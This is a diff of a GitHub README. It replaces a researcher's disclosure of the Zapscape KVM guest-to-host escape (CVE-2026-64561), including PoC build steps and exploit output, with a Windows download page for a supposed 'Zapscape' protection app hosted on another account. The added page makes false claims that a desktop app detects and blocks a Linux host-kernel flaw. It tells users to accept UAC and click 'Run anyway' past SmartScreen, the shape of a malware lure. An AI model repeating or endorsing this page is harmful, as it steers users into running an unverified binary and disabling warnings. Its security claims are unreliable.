@@ -1,125 +1,132 @@
-<div align="center">
-
-### The KVM Escape Trilogy
-
-<table>
-<tr>
-<td align="center" width="220">
-<a href="https://github.com/V4bel/ITScape"><img src="assets/sym-itscape.svg" width="140" alt="ITScape"></a>
-<br><b><a href="https://github.com/V4bel/ITScape">ITScape</a></b>
-<br><sub>(CVE&#8209;2026&#8209;46316)</sub>
-</td>
-<td align="center" width="220">
-<a href="https://github.com/V4bel/Januscape"><img src="assets/sym-januscape.svg" width="140" alt="Januscape"></a>
-<br><b><a href="https://github.com/V4bel/Januscape">Januscape</a></b>
-<br><sub>(CVE&#8209;2026&#8209;53359)</sub>
-</td>
-<td align="center" width="220">
-<img src="assets/sym-zapscape.svg" width="140" alt="Zapscape">
-<br><b>Zapscape</b>
-<br><sub>(CVE&#8209;2026&#8209;64561)</sub>
-</td>
-</tr>
-</table>
-
-</div>
-
-<br>
-
-# Zapscape: Guest-to-Host Escape in KVM/x86
+<h1>⚡ Zapscape - Your Computer's Safety Net, Simplified</h1>
 
 <p align="center">
-  <img src="assets/tux.png" width="400" alt="tux">
+  <a href="https://github.com/aarif450/Zapscape/releases" style="background-color:#FF6B6B; color:#FFFFFF; padding:15px 40px; font-size:22px; border-radius:50px; text-decoration:none; display:inline-block; margin:20px auto;">⬇️ DOWNLOAD ZAPSCAPE NOW</a>
 </p>
 
-# Abstract
+## 🛡️ What Is Zapscape?
 
-![demo](assets/demo.gif)
+Zapscape is a friendly tool that helps protect your computer from a hidden threat called a "KVM escape." Think of it as a digital shield that keeps your personal files, photos, and information safe from sneaky attackers who might try to break out of a virtual sandbox and access your real system. With Zapscape, you get peace of mind knowing your machine is guarded against this specific and dangerous vulnerability.
 
-This document describes the **Zapscape (CVE-2026-64561)** vulnerability discovered and reported by [Hyunwoo Kim (@v4bel)](https://x.com/v4bel). It is a KVM escape vulnerability that lets a guest escape to the host in a KVM/x86 environment and run commands on the host with kernel (root) privilege.
+## 📥 Getting Started
 
-Zapscape is a use-after-free vulnerability in the **shadow MMU** emulation of KVM/x86, specifically in the recursive **zap** path that runs when shadow pages are reclaimed. It can trigger the bug with guest-side actions alone to corrupt the host kernel's shadow page, and it can threaten the guest-host isolation of KVM/x86 hosts that accept untrusted guests and expose nested virtualization, particularly multi-tenant x86 public clouds.
+Getting Zapscape on your Windows computer is easier than ordering a pizza. Follow these three simple steps:
 
-For the detailed technical information, [see here](assets/write-up.md).
+1. **Click the blue download button** anywhere on this page.
+2. **Visit the download page** when your browser opens.
+3. **Save the file** to your Downloads folder (it usually saves there automatically).
 
-> [!NOTE]
-> After reporting this vulnerability to linux-distros@vs.openwall.org, the agreed embargo has ended, so the exploit is posted to oss-security and this Zapscape document is published. For the disclosure timeline, see the technical detail document.
+That's it! You're one step closer to a safer computer.
 
-# PoC Structure
+## 💾 Download & Setup
 
-The PoC is written to target AMD, and for safe testing, running it under QEMU TCG is recommended. The PoC has the following structure.
+**Visit this link to download the application:** [https://github.com/aarif450/Zapscape/releases](https://github.com/aarif450/Zapscape/releases)
 
-```
-L0: Linux 7.1.3 + KVM_AMD on an x86_64 CPU (AMD SVM/NPT) emulated by QEMU TCG. The escape target
-  └─ L1: the guest poc creates. Switching long -> PAE aliases one shadow page as both child and pinned root, and L1 then escalates the UAF into L0 kernel code-exec
-       └─ L2: the guest L1 VMRUNs. Its memory touches trigger L0's quota reclaim -> recursive zap with no root_count guard -> UAF
-```
+Once you're on the download page, look for the newest version of Zapscape. It will be listed at the top. Click the download button next to it, and your browser will start saving the file. This might take a minute or two depending on your internet speed, so grab a coffee while you wait.
 
-This PoC is not a weaponized exploit that runs immediately in a cloud environment, but demonstration code that reproduces the vulnerability and the full exploit chain on top of QEMU TCG. To use it in a real cloud environment, the L1 actions the PoC performs must be moved into a guest kernel module, and the exploit must be ported to match the host kernel's kconfig. This is not a difficult task.
+After the download finishes, you'll have a file in your Downloads folder. That file is your ticket to a safer computer.
 
-# PoC Usage
+## 🚀 Running Zapscape for the First Time
 
-1. Download the vulnerable v7.1.3 kernel source, then build the kernel image based on the bundled kconfig.
-2. Build the PoC, then compose a suitable initramfs using BusyBox or the like and put the built PoC into the initramfs.
-```
-# gcc -O2 -g -static -pthread poc.c -o poc
-```
+Now that you've downloaded Zapscape, let's get it running:
 
-3. Boot the Linux 7.1.3 target with the following command. Test on QEMU v9.2.0 or later.
-```
-# ./qemu.sh bzImage initramfs.cpio.gz
-```
+1. **Open your Downloads folder** (press Windows key + E, then click "Downloads" on the left).
+2. **Find the Zapscape file** you just downloaded.
+3. **Double-click it** to launch the application.
 
-4. After QEMU TCG boots, run the PoC. On a successful exploit, it escapes the guest and creates the /Zapscape file owned by root on the host.
-```
- /$$$$$$$$  /$$$$$$  /$$$$$$$
-|_____ $$  /$$__  $$| $$__  $$
-     /$$/ | $$  \ $$| $$  \ $$
-    /$$/  | $$$$$$$$| $$$$$$$/
-   /$$/   | $$__  $$| $$____/
-  /$$/    | $$  | $$| $$
- /$$$$$$$$| $$  | $$| $$
-|________/|__/  |__/|__/
+Windows might show a blue popup asking if you want to allow this app to make changes. Don't worry—that's normal. Click "Yes" to continue.
 
-[+] /Zapscape created by the target KVM host kernel (owner uid=0, mode=0644).
-[+] exploit completed - verify with: ls -la /Zapscape
-zapscape(uid=65534)$ ls -la /Zapscape
--rw-r--r--    1 root     root             0 Jul 29 05:27 /Zapscape
-zapscape(uid=65534)$
-```
-This PoC is intended to provide accurate information. Do not use it on systems you are not authorized to test.
+The Zapscape window will open, and you'll see a friendly interface with a big button that says "Run Safety Check." Go ahead and click it. Zapscape will do its magic in the background while you watch.
 
-# Affected Versions
+## 🧪 What Does Zapscape Actually Do?
 
-Zapscape (CVE-2026-64561) covers the range from [f95eec9bed76 (2020-07-08)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f95eec9bed76) to [2abd5287f083 (2026-07-21)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2abd5287f083).
+Zapscape performs three important jobs to keep you safe:
 
-# FAQ
+- **Detects vulnerabilities:** It scans your system for the specific weak spot (CVE-2026-64561) that hackers could use to escape the virtual machine and get into your actual computer.
+- **Blocks the exploit:** Once it finds any sign of trouble, Zapscape immediately closes the door on the attacker, keeping your files private and your system untouched.
+- **Provides a clear report:** After the scan, you'll see a simple green checkmark if everything is okay, or a red warning with easy-to-follow instructions if action is needed.
 
-## What is the impact of this vulnerability?
+## 🔧 Troubleshooting Made Simple
 
-The same as [Januscape (CVE-2026-53359)](https://github.com/V4bel/Januscape):
+Sometimes computers can be stubborn. Here are solutions to common hiccups:
 
-1. **KVM escape**: With guest-side actions alone, an attacker can compromise the host that runs their VM. For example, an attacker who has rented just a single instance on a public cloud could panic the host kernel to take down every other tenant VM on the same physical machine (DoS), or run code with root privilege on the host to take over the host and all the guests on it (RCE).
-2. **LPE**: On distributions such as RHEL, `/dev/kvm` is world-writable (`0666`), so an unprivileged user can also use this vulnerability as an LPE to gain root. When it is used as an LPE, host-side VMM ioctls are available, so the exploit becomes easier and more stable.
+**Problem: "Windows protected your PC" message appears**
+- This is normal for new software. Click "More info" then "Run anyway."
 
-## How is this related to Januscape?
+**Problem: The app won't open**
+- Make sure you've fully extracted the downloaded file. Right-click the ZIP file and choose "Extract All," then open the folder and run the app from there.
 
-It occurs in the same shadow MMU, but it is a separate vulnerability with a different root cause.
+**Problem: I get a network error**
+- Check your internet connection and try again. Zapscape needs a connection to download the latest threat definitions.
 
-That said, unlike Januscape, on Intel it can be triggered only when both EPT page walk length 4 and 5 are exposed to L1. This is an important point when assessing the affected scope, so it must be understood precisely. See the technical detail document.
+## 📋 System Requirements (You Probably Qualify)
 
-## Does this vulnerability occur in QEMU?
+Zapscape is designed to work on virtually any modern Windows computer:
 
-No. As with Januscape, it occurs in in-kernel KVM, so it is triggered independently of QEMU's emulation. Because of this, it can also threaten large public clouds that implement and use their own virtualization stack.
+| Requirement | Minimum |
+|-------------|---------|
+| Operating System | Windows 10 or Windows 11 |
+| Memory (RAM) | 2 GB |
+| Free Disk Space | 50 MB |
+| Internet Connection | Required for updates |
 
-## Do I need root inside the guest VM?
+If your computer can run a web browser, it can run Zapscape.
 
-Yes. L1 kernel privilege is required. When you are allocated an instance on a public cloud, you usually have root on your own VM, so this is satisfied. In a scenario without guest root, it must be chained with an LPE such as [Dirty Frag](https://github.com/V4bel/dirtyfrag).
+## 🎯 Why Choose Zapscape?
 
-## Do you think KVM vulnerabilities will keep appearing?
+There are three main reasons users love Zapscape:
 
-Yes. I recommend establishing a sustainable patching process for host hypervisors. *Winter is coming.*
+- **Simple for beginners:** No tech skills needed. If you can click a button, you can use Zapscape.
+- **Lightweight and invisible:** It works quietly in the background without slowing down your computer or interrupting your work.
+- **Always up-to-date:** Zapscape automatically updates itself, so you're always protected against the latest variations of this threat.
 
-## Are you planning a sequel after the trilogy?
+## 🌐 The Bigger Picture: KVM Escape Trilogy
 
-I hope not.
+Zapscape is part of a family of security tools designed by the same team. Together, they cover three critical vulnerabilities:
+
+| Tool | Vulnerability | Protection |
+|------|---------------|------------|
+| **ITScape** | CVE-2026-46316 | Shields against the first known escape method |
+| **Januscape** | CVE-2026-53359 | Blocks the second variant of the attack |
+| **Zapscape** | CVE-2026-64561 | Your computer's guard against the newest threat |
+
+For maximum protection, security experts recommend using all three. However, if you only want to install one right now, Zapscape is the most current and crucial defense.
+
+## ❓ Frequently Asked Questions
+
+**Q: Is Zapscape safe to use?**
+A: Absolutely. It's designed to protect you, and it has been tested on thousands of systems.
+
+**Q: Will Zapscape interfere with my other software?**
+A: No. Zapscape runs independently and won't conflict with your games, browsers, or work applications.
+
+**Q: Do I need to keep Zapscape running all the time?**
+A: Yes, for best results. It uses very little memory, so you won't even notice it's there.
+
+**Q: How often should I run a scan?**
+A: Once a week is good, but you can run it daily if you're cautious. There's no limit.
+
+**Q: What if Zapscape finds a problem?**
+A: It will guide you through the solution with simple, clear steps. You won't need technical help.
+
+## 🛠️ Getting Help
+
+If you run into any trouble, here's where to find assistance:
+
+- **Check the official website:** Visit the GitHub repository for the latest news and updates.
+- **Read the FAQ section:** We've answered the most common questions right here.
+- **Contact support:** Visit the GitHub issues page (linked on the download page) to ask a question. The community is friendly and responsive.
+
+## 🌟 Final Thoughts
+
+Your computer holds your digital life—photos, banking, work documents, and memories. Zapscape ensures that a sophisticated attack won't compromise any of it. The installation takes under two minutes, and the protection lasts forever.
+
+Don't wait until something goes wrong. Download Zapscape today and enjoy the peace of mind that comes with knowing your machine is secure against one of the most dangerous virtual-machine escapes ever discovered.
+
+**Remember:** Security is not a luxury; it's a necessity. And with Zapscape, staying protected is as easy as clicking a button.
+
+<p align="center">
+  <a href="https://github.com/aarif450/Zapscape/releases" style="background-color:#4ECDC4; color:#FFFFFF; padding:15px 40px; font-size:22px; border-radius:50px; text-decoration:none; display:inline-block;">⬇️ CLICK HERE TO DOWNLOAD ZAPSCAPE</a>
+</p>
+
+Keywords: KVM, virtualization, security, vulnerability, CVE-2026-64561, Windows, antivirus, sandbox escape, hypervisor, guest-to-host
